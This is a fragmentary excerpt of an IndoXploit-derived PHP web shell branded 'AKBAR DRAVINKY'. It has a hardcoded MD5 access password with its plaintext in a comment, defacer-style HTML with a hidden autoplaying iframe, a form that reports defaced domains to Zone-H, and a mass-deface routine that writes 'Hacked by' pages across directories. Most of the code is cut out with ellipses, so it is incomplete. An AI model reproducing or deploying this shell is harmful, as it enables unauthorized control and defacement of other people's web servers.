...
$password = "9da0e9bc33ebb3fbcb85bda7f6e6255d"; # md5: akbar dravinky 
...
<center>
<header>
	<pre><center><img style="width:400px;" src="https://image.ibb.co/hWAnfA/IMG-20181110-015020.jpg"> 
</center><br><font color="red" face="Papyrus">shell </font><font color="White" face="Papyrus">TYPAL SECURITY</font><br><iframe width="1" height="1"akbar dravinky.com" frameborder="0" allowfullscreen=""></iframe>
<p></p> <br><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="100%" style="width: 100%;">
<font color="white">_____________________</font></marquee><marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="40" width="100%" style="width: 100%;">
<font color="Red">_____________________</font></marquee><br>
...
?>
<!DOCTYPE HTML>
<center><marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="40" width="100%" style="width: 100%;">
<font color="Red">_____________________</font></marquee><br><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="100%" style="width: 100%;">
<font color="white">_____________________</font></marquee><br><img style="width:270px;" src="https://image.ibb.co/nJDyDp/Pics_Art_09_04_09_47_09.jpg"><br><br>
</center><html><br><center><font color="red" face="Papyrus">Shell By </font><font color="White" face="Papyrus"> AKBAR DRAVINKY </font></center>
<!--
###############################################################################
...
// Tapi Selebihnya, itu hasil kreasi Herp :VXploit sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member IndoXploit. & All My Friends.
###############################################################################
// Special Thanks: SoraCyberTeam | Obsidian Cyber Team | N45HT
###############################################################################
-->
<head>
<title>AKBAR DRAVINKY</title>
<meta name='author' content='AKBAR DRAVINKY'>
<meta charset="UTF-8">
<style type='text/css'>
...
<body dir="ltr" alink="#0033FF" background="" bgcolor="#000000" link="grey" text="grey" vlink="#FF0000" onkeydown="return false"><iframe width="1" height="1" src="https://www.youtube.com/embed/ZCu2gwLj9ok?rel=0&amp;autoplay=1&amp;loop=1&amp;playlist=LApS9G22cIU" frameborder="0" allowfullscreen=""></iframe>
<p></p>
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Tito Sembiring '><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Tito Sembiring </textarea><br>
